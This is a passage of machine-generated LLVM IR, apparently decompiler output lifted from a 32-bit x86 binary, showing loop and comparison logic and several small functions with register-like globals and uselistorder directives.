  %v8_804cd79 = icmp sgt i32 %v0_804cd77.pre, %v3_804cd74
  br i1 %v8_804cd79, label %dec_label_pc_804cd73, label %dec_label_pc_804cd7b

dec_label_pc_804cd7b:                             ; preds = %dec_label_pc_804cd73
  store i32 ptrtoint ([21 x i8]* @global_var_8053ae1.129 to i32), i32* @ecx, align 4
  %v1_804cd82 = add i32 %v0_804cd73, -134560471
  store i32 %v1_804cd82, i32* %eax.global-to-local, align 4
  %v2_804cd87 = add i32 %v0_804cd73, add (i32 ptrtoint (i32* @global_var_8053ac8.131 to i32), i32 -134560471)
  %v3_804cd87 = add i32 %v2_804cd87, %v1_804cd82
  %v4_804cd87 = inttoptr i32 %v3_804cd87 to i16*
  %v5_804cd87 = load i16, i16* %v4_804cd87, align 2
  %v6_804cd87 = sext i16 %v5_804cd87 to i32
  store i32 %v6_804cd87, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804cd82, 2
  %v3_804cd8f = add i32 %factor, 134560440
  %v4_804cd8f = inttoptr i32 %v3_804cd8f to i16*
  %v5_804cd8f = load i16, i16* %v4_804cd8f, align 2
  %v6_804cd8f = sext i16 %v5_804cd8f to i32
  store i32 %v6_804cd8f, i32* %eax.global-to-local, align 4
  %v1_804cd97 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cd97 = or i32 %v1_804cd97, %v6_804cd87
  %v2_804cd99 = and i32 %v2_804cd97, %v6_804cd8f
  store i32 %v2_804cd99, i32* %edx.global-to-local, align 4
  %v0_804cdab.pre = load i32, i32* @esi, align 4
  %v0_804cdae.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804cda3

dec_label_pc_804cd9d:                             ; preds = %dec_label_pc_804cd4d
  %v1_804cd9d = add i32 %v0_804cd9d, 1
  store i32 %v1_804cd9d, i32* @ecx, align 4
  %v1_804cd9e = inttoptr i32 %v1_804cd9d to i8*
  %v2_804cd9e = load i8, i8* %v1_804cd9e, align 1
  %v3_804cd9e = icmp eq i8 %v2_804cd9e, 0
  %v1_804cda1 = icmp eq i1 %v3_804cd9e, false
  br i1 %v1_804cda1, label %dec_label_pc_804cd4d, label %dec_label_pc_804cda3

dec_label_pc_804cda3:                             ; preds = %dec_label_pc_804cd9d, %dec_label_pc_804cd7b
  %v0_804cdae = phi i32 [ %v0_804cdae.pre, %dec_label_pc_804cd7b ], [ %storemerge4, %dec_label_pc_804cd9d ]
  %v0_804cdab = phi i32 [ %v0_804cdab.pre, %dec_label_pc_804cd7b ], [ %v0_804cd37, %dec_label_pc_804cd9d ]
  %v0_804cda3 = phi i32 [ %v2_804cd99, %dec_label_pc_804cd7b ], [ %v3_804cd44, %dec_label_pc_804cd9d ]
  store i32 %v0_804cda3, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804cdab = inttoptr i32 %v0_804cdab to i8*
  %v2_804cdab = load i8, i8* %v1_804cdab, align 1
  %v3_804cdab = sext i8 %v2_804cdab to i32
  store i32 %v3_804cdab, i32* %eax.global-to-local, align 4
  %v2_804cdae = add i32 %tmp76, 4
  %v3_804cdae = inttoptr i32 %v2_804cdae to i32*
  store i32 %v0_804cdae, i32* %v3_804cdae, align 4
  %v0_804cdb1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cdb1 = load i32, i32* @edx, align 4
  %v2_804cdb1 = add i32 %v1_804cdb1, 12
  %v3_804cdb1 = inttoptr i32 %v2_804cdb1 to i32*
  store i32 %v0_804cdb1, i32* %v3_804cdb1, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804cdb8 = load i32, i32* @edx, align 4
  %v1_804cdb8 = add i32 %v0_804cdb8, 28
  %v2_804cdb8 = inttoptr i32 %v1_804cdb8 to i32*
  store i32 1, i32* %v2_804cdb8, align 4
  %v0_804cdbf = load i32, i32* %eax.global-to-local, align 4
  %v1_804cdbf = load i32, i32* @edx, align 4
  %v2_804cdbf = add i32 %v1_804cdbf, 8
  %v3_804cdbf = inttoptr i32 %v2_804cdbf to i32*
  store i32 %v0_804cdbf, i32* %v3_804cdbf, align 4
  %v0_804cdc2 = load i32, i32* %edi.global-to-local, align 4
  %v1_804cdcc = and i32 %v0_804cdc2, -5
  %v0_804cdd2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cdd2 = and i32 %v0_804cdd2, 3840
  store i32 %v1_804cdd2, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804cddb = or i32 %v1_804cdd2, %v1_804cdcc
  store i32 %v2_804cddb, i32* @edi, align 4
  %v1_804cddd = load i32, i32* @edx, align 4
  %v2_804cddd = add i32 %v1_804cddd, 20
  %v3_804cddd = inttoptr i32 %v2_804cddd to i32*
  store i32 48, i32* %v3_804cddd, align 4
  %v0_804cde0 = load i32, i32* @edi, align 4
  %v1_804cde0 = load i32, i32* @edx, align 4
  %v2_804cde0 = add i32 %v1_804cde0, 16
  %v3_804cde0 = inttoptr i32 %v2_804cde0 to i32*
  store i32 %v0_804cde0, i32* %v3_804cde0, align 4
  %v0_804cde3 = load i32, i32* @ecx, align 4
  %v1_804cde3 = inttoptr i32 %v0_804cde3 to i8*
  %v2_804cde3 = load i8, i8* %v1_804cde3, align 1
  %v3_804cde3 = icmp eq i8 %v2_804cde3, 0
  %v1_804cde6 = icmp eq i1 %v3_804cde3, false
  br i1 %v1_804cde6, label %dec_label_pc_804cdff, label %dec_label_pc_804cde8

dec_label_pc_804cde8:                             ; preds = %dec_label_pc_804cda3
  %v0_804cde8 = load i32, i32* @esi, align 4
  %v1_804cde8 = inttoptr i32 %v0_804cde8 to i8*
  %v2_804cde8 = load i8, i8* %v1_804cde8, align 1
  %v11_804cde8 = icmp eq i8 %v2_804cde8, 109
  %v1_804cdeb = icmp eq i1 %v11_804cde8, false
  br i1 %v1_804cdeb, label %dec_label_pc_804cef9, label %dec_label_pc_804cdf1

dec_label_pc_804cdf1:                             ; preds = %dec_label_pc_804cde8
  %v0_804cdf1 = load i32, i32* @edx, align 4
  %v1_804cdf1 = add i32 %v0_804cdf1, 32
  %v2_804cdf1 = inttoptr i32 %v1_804cdf1 to i32*
  store i32 20, i32* %v2_804cdf1, align 4
  %v0_804cdf8 = load i32, i32* @edx, align 4
  %v1_804cdf8 = add i32 %v0_804cdf8, 28
  %v2_804cdf8 = inttoptr i32 %v1_804cdf8 to i32*
  store i32 0, i32* %v2_804cdf8, align 4
  br label %dec_label_pc_804cdff

dec_label_pc_804cdff:                             ; preds = %dec_label_pc_804cda3, %dec_label_pc_804cdf1
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804ce9b, label %dec_label_pc_804ce0a

dec_label_pc_804ce0a:                             ; preds = %dec_label_pc_804cdff
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_804ce83 = add i32 %tmp76, 40
  %v4_804ce19 = add i32 %tmp76, 36
  %v1_804ce8c = add i32 %tmp76, 28
  %v2_804ce8c = inttoptr i32 %v1_804ce8c to i32*
  br label %dec_label_pc_804ce0c

dec_label_pc_804ce0c:                             ; preds = %dec_label_pc_804ce87, %dec_label_pc_804ce0a
  %v0_804ce22 = phi i32 [ 0, %dec_label_pc_804ce0a ], [ %v1_804ce8b, %dec_label_pc_804ce87 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ce0a ], [ %stack_var_-88.5, %dec_label_pc_804ce87 ]
  %v1_804ce0c = add i32 %v0_804ce22, -2
  %v6_804ce0c = sub i32 1, %v0_804ce22
  %v7_804ce0c = and i32 %v6_804ce0c, %v0_804ce22
  %v8_804ce0c = icmp slt i32 %v7_804ce0c, 0
  %v9_804ce0c = icmp eq i32 %v1_804ce0c, 0
  %v10_804ce0c = icmp slt i32 %v1_804ce0c, 0
  %v3_804ce0f = icmp eq i1 %v10_804ce0c, %v8_804ce0c
  %v4_804ce0f = icmp eq i1 %v9_804ce0c, false
  %v5_804ce0f = and i1 %v4_804ce0f, %v3_804ce0f
  br i1 %v5_804ce0f, label %dec_label_pc_804ce22, label %dec_label_pc_804ce11

dec_label_pc_804ce11:                             ; preds = %dec_label_pc_804ce0c
  %v0_804ce11 = load i32, i32* @esp, align 4
  %v2_804ce11 = mul i32 %v0_804ce22, 4
  %v3_804ce11 = add i32 %v2_804ce11, 68
  %v4_804ce11 = add i32 %v3_804ce11, %v0_804ce11
  %v5_804ce11 = inttoptr i32 %v4_804ce11 to i32*
  %v6_804ce11 = load i32, i32* %v5_804ce11, align 4
  store i32 %v6_804ce11, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804ce19 = trunc i32 %v6_804ce11 to i8
  %v5_804ce19 = add i32 %v4_804ce19, %v0_804ce22
  %v6_804ce19 = inttoptr i32 %v5_804ce19 to i8*
  store i8 %v1_804ce19, i8* %v6_804ce19, align 1
  %v0_804ce1d = load i32, i32* %eax.global-to-local, align 4
  %v1_804ce1d = urem i32 %v0_804ce1d, 256
  br label %dec_label_pc_804ce2b

dec_label_pc_804ce22:                             ; preds = %dec_label_pc_804ce0c
  %v5_804ce24 = add i32 %v0_804ce22, %stack_var_-32.3
  store i32 %v5_804ce24, i32* %eax.global-to-local, align 4
  %v1_804ce28 = add i32 %v5_804ce24, -2
  br label %dec_label_pc_804ce2b

dec_label_pc_804ce2b:                             ; preds = %dec_label_pc_804ce11, %dec_label_pc_804ce22
  %v0_804ce3e = phi i32 [ %v1_804ce1d, %dec_label_pc_804ce11 ], [ %v1_804ce28, %dec_label_pc_804ce22 ]
  store i32 %v0_804ce3e, i32* %eax.global-to-local, align 4
  %v5_804ce2b = sub i32 %v0_804ce3e, %stack_var_-88.4
  %v11_804ce2b = xor i32 %v0_804ce3e, %stack_var_-88.4
  %v12_804ce2b = xor i32 %v5_804ce2b, %v0_804ce3e
  %v13_804ce2b = and i32 %v12_804ce2b, %v11_804ce2b
  %v14_804ce2b = icmp slt i32 %v13_804ce2b, 0
  %v15_804ce2b = icmp eq i32 %v5_804ce2b, 0
  %v16_804ce2b = icmp slt i32 %v5_804ce2b, 0
  %v3_804ce2f = icmp ne i1 %v16_804ce2b, %v14_804ce2b
  %v4_804ce2f = or i1 %v15_804ce2b, %v3_804ce2f
  br i1 %v4_804ce2f, label %dec_label_pc_804ce3e, label %dec_label_pc_804ce31

dec_label_pc_804ce31:                             ; preds = %dec_label_pc_804ce2b
  %v1_804ce31 = add i32 %v0_804ce3e, -9
  %v6_804ce31 = sub i32 8, %v0_804ce3e
  %v7_804ce31 = and i32 %v6_804ce31, %v0_804ce3e
  %v8_804ce31 = icmp slt i32 %v7_804ce31, 0
  %v9_804ce31 = icmp eq i32 %v1_804ce31, 0
  %v10_804ce31 = icmp slt i32 %v1_804ce31, 0
  %v3_804ce34 = icmp eq i1 %v10_804ce31, %v8_804ce31
  %v4_804ce34 = icmp eq i1 %v9_804ce31, false
  %v5_804ce34 = and i1 %v4_804ce34, %v3_804ce34
  br i1 %v5_804ce34, label %dec_label_pc_804cef9, label %dec_label_pc_804ce3e

dec_label_pc_804ce3e:                             ; preds = %dec_label_pc_804ce31, %dec_label_pc_804ce2b
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804ce2b ], [ %v0_804ce3e, %dec_label_pc_804ce31 ]
  %v1_804ce3e = add i32 %v0_804ce3e, -1
  store i32 %v1_804ce3e, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804ce47 = load i32, i32* @esp, align 4
  %v1_804ce47 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ce47 = mul i32 %v1_804ce47, 4
  %v3_804ce47 = add i32 %v0_804ce47, 80
  %v4_804ce47 = add i32 %v3_804ce47, %v2_804ce47
  %v5_804ce47 = inttoptr i32 %v4_804ce47 to i32*
  %v6_804ce47 = load i32, i32* %v5_804ce47, align 4
  store i32 %v6_804ce47, i32* %edi.global-to-local, align 4
  %v2_804ce4b = mul i32 %v1_804ce3e, 4
  %v4_804ce4b = add i32 %v4_804ce83, %v2_804ce4b
  %v5_804ce4b = inttoptr i32 %v4_804ce4b to i32*
  %v6_804ce4b = load i32, i32* %v5_804ce4b, align 4
  store i32 %v6_804ce4b, i32* @eax, align 4
  %v9_804ce4f = icmp eq i32 %v6_804ce47, 8
  br i1 %v9_804ce4f, label %dec_label_pc_804ce87, label %dec_label_pc_804ce54

dec_label_pc_804ce54:                             ; preds = %dec_label_pc_804ce3e
  %v9_804ce54 = icmp eq i32 %v6_804ce4b, 8
  br i1 %v9_804ce54, label %dec_label_pc_804ce77, label %dec_label_pc_804ce59

dec_label_pc_804ce59:                             ; preds = %dec_label_pc_804ce54
  %v12_804ce59 = icmp eq i32 %v6_804ce4b, %v6_804ce47
  br i1 %v12_804ce59, label %dec_label_pc_804ce77, label %dec_label_pc_804ce5d

dec_label_pc_804ce5d:                             ; preds = %dec_label_pc_804ce59
  %v1_804ce5d = call i32 @function_804cb0c(i32 %v1_804ce3e)
  store i32 %v1_804ce5d, i32* %ebx.global-to-local, align 4
  %v0_804ce64 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804ce64, i32* @eax, align 4
  %v1_804ce66 = call i32 @function_804cb0c(i32 %v1_804ce3e)
  %v2_804ce6b = sub i32 %v1_804ce5d, %v1_804ce66
  %v8_804ce6b = xor i32 %v1_804ce5d, %v1_804ce66
  %v9_804ce6b = xor i32 %v2_804ce6b, %v1_804ce5d
  %v10_804ce6b = and i32 %v9_804ce6b, %v8_804ce6b
  %v11_804ce6b = icmp slt i32 %v10_804ce6b, 0
  %v12_804ce6b = icmp eq i32 %v2_804ce6b, 0
  %v13_804ce6b = icmp slt i32 %v2_804ce6b, 0
  %v3_804ce6d = icmp ne i1 %v13_804ce6b, %v11_804ce6b
  %v4_804ce6d = or i1 %v12_804ce6b, %v3_804ce6d
  %v5_804ce6d = zext i1 %v4_804ce6d to i32
  store i32 %v5_804ce6d, i32* %eax.global-to-local, align 4
  %v1_804ce73 = icmp eq i1 %v4_804ce6d, false
  br i1 %v1_804ce73, label %dec_label_pc_804ce87, label %dec_label_pc_804ce5d.dec_label_pc_804ce77_crit_edge

dec_label_pc_804ce5d.dec_label_pc_804ce77_crit_edge: ; preds = %dec_label_pc_804ce5d
  %v0_804ce77.pre = load i32, i32* @esp, align 4
  %v1_804ce77.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ce77

dec_label_pc_804ce77:                             ; preds = %dec_label_pc_804ce5d.dec_label_pc_804ce77_crit_edge, %dec_label_pc_804ce59, %dec_label_pc_804ce54
  %v1_804ce77 = phi i32 [ %v1_804ce77.pre, %dec_label_pc_804ce5d.dec_label_pc_804ce77_crit_edge ], [ %v1_804ce47, %dec_label_pc_804ce59 ], [ %v1_804ce47, %dec_label_pc_804ce54 ]
  %v0_804ce77 = phi i32 [ %v0_804ce77.pre, %dec_label_pc_804ce5d.dec_label_pc_804ce77_crit_edge ], [ %v0_804ce47, %dec_label_pc_804ce59 ], [ %v0_804ce47, %dec_label_pc_804ce54 ]
  %v2_804ce77 = mul i32 %v1_804ce77, 4
  %v3_804ce77 = add i32 %v0_804ce77, 80
  %v4_804ce77 = add i32 %v3_804ce77, %v2_804ce77
  %v5_804ce77 = inttoptr i32 %v4_804ce77 to i32*
  %v6_804ce77 = load i32, i32* %v5_804ce77, align 4
  store i32 %v6_804ce77, i32* %eax.global-to-local, align 4
  store i32 %v1_804ce3e, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_804ce77, i32* %v5_804ce4b, align 4
  br label %dec_label_pc_804ce87

dec_label_pc_804ce87:                             ; preds = %dec_label_pc_804ce5d, %dec_label_pc_804ce3e, %dec_label_pc_804ce77
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804ce8b = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ce8b = add i32 %v0_804ce8b, 1
  store i32 %v1_804ce8b, i32* %ebp.global-to-local, align 4
  %v3_804ce8c = load i32, i32* %v2_804ce8c, align 4
  %v1_804ce8f = add i32 %v3_804ce8c, 2
  store i32 %v1_804ce8f, i32* %eax.global-to-local, align 4
  %v5_804ce94 = icmp slt i32 %v1_804ce8b, %v1_804ce8f
  br i1 %v5_804ce94, label %dec_label_pc_804ce0c, label %dec_label_pc_804cec2

dec_label_pc_804ce9b:                             ; preds = %dec_label_pc_804cdff
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804ce9f = add i32 %tmp76, 38
  %v2_804ce9f = inttoptr i32 %v1_804ce9f to i8*
  store i8 1, i8* %v2_804ce9f, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804cea8 = add i32 %tmp76, 28
  %v2_804cea8 = inttoptr i32 %v1_804cea8 to i32*
  %v3_804cea8 = load i32, i32* %v2_804cea8, align 4
  %v2_804ceab = mul i32 %v3_804cea8, 4
  %v2_804ceaf = ptrtoint i32* %stack_var_-20 to i32
  %v1_804ceb6 = add i32 %tmp76, 40
  store i32 %v1_804ceb6, i32* %eax.global-to-local, align 4
  %v3_804ceba = inttoptr i32 %v1_804ceb6 to i16*
  %v4_804ceba = call i32 @function_804d4b8(i16* %v3_804ceba, i32 %v2_804ceaf, i32 %v2_804ceab)
  store i32 %v4_804ceba, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cec2

dec_label_pc_804cec2:                             ; preds = %dec_label_pc_804ce87, %dec_label_pc_804ce9b
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ce9b ], [ %stack_var_-88.5, %dec_label_pc_804ce87 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_804ceca = inttoptr i32 %v1_804cb6b to i8*
  %v3_804ceca = load i8, i8* %v2_804ceca, align 1
  %v5_804ceca = icmp slt i8 %v3_804ceca, 0
  store i32 %stack_var_-88.6, i32* %v2_804cb64, align 4
  br i1 %v5_804ceca, label %dec_label_pc_804ceda, label %dec_label_pc_804ced3

dec_label_pc_804ced3:                             ; preds = %dec_label_pc_804cec2
  %v0_804ced3 = load i32, i32* @esi, align 4
  %v1_804ced3 = add i32 %v0_804ced3, 1
  store i32 %v1_804ced3, i32* %eax.global-to-local, align 4
  %v1_804ced6 = load i32, i32* @ecx, align 4
  %v2_804ced6 = inttoptr i32 %v1_804ced6 to i32*
  store i32 %v1_804ced3, i32* %v2_804ced6, align 4
  br label %dec_label_pc_804ceed

dec_label_pc_804ceda:                             ; preds = %dec_label_pc_804cec2
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_804cb38, i32* %edx.global-to-local, align 4
  %v0_804cee2 = load i32, i32* @esi, align 4
  %v2_804cee2 = sub i32 %v0_804cee2, %v4_804cb38
  store i32 %v2_804cee2, i32* %esi.global-to-local, align 4
  %v1_804cee4 = mul i32 %v2_804cee2, 4
  %v2_804cee4 = add i32 %v1_804cee4, 224
  store i32 %v2_804cee4, i32* %eax.global-to-local, align 4
  %v2_804ceeb = load i32, i32* %arg1, align 4
  %v4_804ceeb = add i32 %v2_804ceeb, %v2_804cee4
  store i32 %v4_804ceeb, i32* %arg1, align 4
  br label %dec_label_pc_804ceed

dec_label_pc_804ceed:                             ; preds = %dec_label_pc_804ced3, %dec_label_pc_804ceda
  store i32 %tmp76, i32* @edx, align 4
  %v1_804cef1 = add i32 %tmp76, 28
  %v2_804cef1 = inttoptr i32 %v1_804cef1 to i32*
  %v3_804cef1 = load i32, i32* %v2_804cef1, align 4
  store i32 %v3_804cef1, i32* %eax.global-to-local, align 4
  %v1_804cef4 = add i32 %v3_804cef1, 2
  br label %dec_label_pc_804cefc

dec_label_pc_804cef9:                             ; preds = %dec_label_pc_804cb89, %dec_label_pc_804cc23, %dec_label_pc_804cc56, %dec_label_pc_804ccd1, %dec_label_pc_804ccbd, %dec_label_pc_804ccb4, %dec_label_pc_804ce31, %dec_label_pc_804cde8, %dec_label_pc_804cd33
  br label %dec_label_pc_804cefc

dec_label_pc_804cefc:                             ; preds = %dec_label_pc_804ceed, %dec_label_pc_804cef9
  %storemerge6 = phi i32 [ %v1_804cef4, %dec_label_pc_804ceed ], [ -1, %dec_label_pc_804cef9 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804ceff = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ceff, i32* @ebx, align 4
  store i32 %v0_804cb37, i32* @esi, align 4
  store i32 %v0_804cb36, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_804ce8b, { 0, 2, 1 }
  uselistorder i32 %v2_804ce6b, { 1, 2, 0 }
  uselistorder i32 %v1_804ce5d, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804ce3e, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804ce31, { 1, 0 }
  uselistorder i32 %v5_804ce2b, { 1, 2, 0 }
  uselistorder i32 %v0_804ce3e, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804ce0c, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804ce22, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_804cd9d, { 1, 2, 0 }
  uselistorder i32 %v1_804cd73, { 1, 2, 0 }
  uselistorder i32 %v0_804cd9d, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804cd39, { 1, 0 }
  uselistorder i32 %v1_804cd26, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804cd2f, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804cd19, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804cd0f, { 1, 0 }
  uselistorder i32 %v1_804ccf1, { 1, 0 }
  uselistorder i32 %v0_804cd0f.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804ccd4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804cccb, { 1, 2, 0 }
  uselistorder i32 %v0_804cc91, { 1, 0 }
  uselistorder i32 %v1_804cc83, { 1, 0 }
  uselistorder i32 %v1_804cc7e, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804cc7c, { 2, 0, 1 }
  uselistorder i32 %v0_804cc9e, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804cc39, { 1, 2, 0 }
  uselistorder i32 %v0_804cc11, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_804cc07, { 1, 2, 0 }
  uselistorder i32 %v6_804cc05, { 0, 2, 1 }
  uselistorder i32 %v0_804cc04, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_804cbfd, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_804cbfd, { 2, 1, 0 }
  uselistorder i32 %v1_804cbf5, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_804cbdb, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804cbb1, { 0, 2, 1 }
  uselistorder i32 %v0_804cb9e, { 2, 0, 1 }
  uselistorder i32 %v4_804cb38, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 (i32)* @function_804cb0c, { 1, 0 }
  uselistorder i32 -9, { 2, 0, 3, 1 }
  uselistorder i32 -5, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -134560471, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_8053ae1.129 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804cefc, { 1, 0 }
  uselistorder label %dec_label_pc_804cef9, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804ceed, { 1, 0 }
  uselistorder label %dec_label_pc_804cec2, { 1, 0 }
  uselistorder label %dec_label_pc_804ce87, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ce2b, { 1, 0 }
  uselistorder label %dec_label_pc_804cdff, { 1, 0 }
  uselistorder label %dec_label_pc_804cd67, { 1, 0 }
  uselistorder label %dec_label_pc_804cd33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cd0a, { 1, 0 }
  uselistorder label %dec_label_pc_804cce1, { 1, 0 }
  uselistorder label %dec_label_pc_804cca8, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804cc4b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cc05, { 1, 0 }
  uselistorder label %dec_label_pc_804cc04, { 1, 0 }
  uselistorder label %dec_label_pc_804cbeb, { 1, 0 }
  uselistorder label %dec_label_pc_804cbd4, { 1, 0 }
  uselistorder label %dec_label_pc_804cbd4.outer, { 2, 0, 1 }
}

define i32 @function_804cf04(i16* %arg1) local_unnamed_addr {
dec_label_pc_804cf04:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v12_804cf07 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804cf0a = ptrtoint i16* %arg1 to i32
  store i32 %v4_804cf0a, i32* %esi.global-to-local, align 4
  %v1_804cf0e = add i32 %v4_804cf0a, 52
  %v2_804cf0e = inttoptr i32 %v1_804cf0e to i32*
  %v3_804cf0e = load i32, i32* %v2_804cf0e, align 4
  %v1_804cf11 = icmp eq i32 %v3_804cf0e, 0
  %v1_804cf13 = icmp eq i1 %v1_804cf11, false
  br i1 %v1_804cf13, label %dec_label_pc_804cf34, label %dec_label_pc_804cf15

dec_label_pc_804cf15:                             ; preds = %dec_label_pc_804cf04
  %v1_804cf15 = add i32 %v4_804cf0a, 56
  store i32 %v1_804cf15, i32* %ebx.global-to-local, align 4
  store i32 %v12_804cf07, i32* @eax, align 4
  %v2_804cf24 = call i32 @function_804f65e(i32 %v12_804cf07, i32 134542939)
  %v1_804cf2c = call i32 @function_804f65b(i32 %v1_804cf15)
  %v0_804cf36.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804cf34

dec_label_pc_804cf34:                             ; preds = %dec_label_pc_804cf04, %dec_label_pc_804cf15
  %v0_804cf36 = phi i32 [ %v4_804cf0a, %dec_label_pc_804cf04 ], [ %v0_804cf36.pre, %dec_label_pc_804cf15 ]
  %v1_804cf36 = inttoptr i32 %v0_804cf36 to i16*
  %v2_804cf36 = load i16, i16* %v1_804cf36, align 2
  %v3_804cf36 = zext i16 %v2_804cf36 to i32
  store i32 %v3_804cf36, i32* %ebx.global-to-local, align 4
  br i1 %v1_804cf13, label %dec_label_pc_804cf4c, label %dec_label_pc_804cf3b

dec_label_pc_804cf3b:                             ; preds = %dec_label_pc_804cf34
  store i32 %v12_804cf07, i32* @eax, align 4
  %v2_804cf44 = call i32 @function_804f65e(i32 %v12_804cf07, i32 1)
  %v0_804cf4f.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804cf4c

dec_label_pc_804cf4c:                             ; preds = %dec_label_pc_804cf34, %dec_label_pc_804cf3b
  %v0_804cf4f = phi i32 [ %v3_804cf36, %dec_label_pc_804cf34 ], [ %v0_804cf4f.pre, %dec_label_pc_804cf3b ]
  %v1_804cf4f = and i32 %v0_804cf4f, 4
  ret i32 %v1_804cf4f

; uselistorder directives
  uselistorder i32 %v12_804cf07, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804cf4c, { 1, 0 }
  uselistorder label %dec_label_pc_804cf34, { 1, 0 }
}

define i32 @function_804cf58(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804cf58:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804cf58 = load i32, i32* @edi, align 4
  %v0_804cf59 = load i32, i32* @esi, align 4
  %v0_804cf5a = load i32, i32* @ebx, align 4
  %v12_804cf5b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_804cf62 = add i32 %arg3, 52
  %v2_804cf62 = inttoptr i32 %v1_804cf62 to i32*
  %v3_804cf62 = load i32, i32* %v2_804cf62, align 4
  store i32 %v3_804cf62, i32* @edi, align 4
  %v1_804cf65 = icmp eq i32 %v3_804cf62, 0
  %v1_804cf67 = icmp eq i1 %v1_804cf65, false
  br i1 %v1_804cf67, label %dec_label_pc_804cf58.dec_label_pc_804cf88_crit_edge, label %dec_label_pc_804cf69

dec_label_pc_804cf58.dec_label_pc_804cf88_crit_edge: ; preds = %dec_label_pc_804cf58
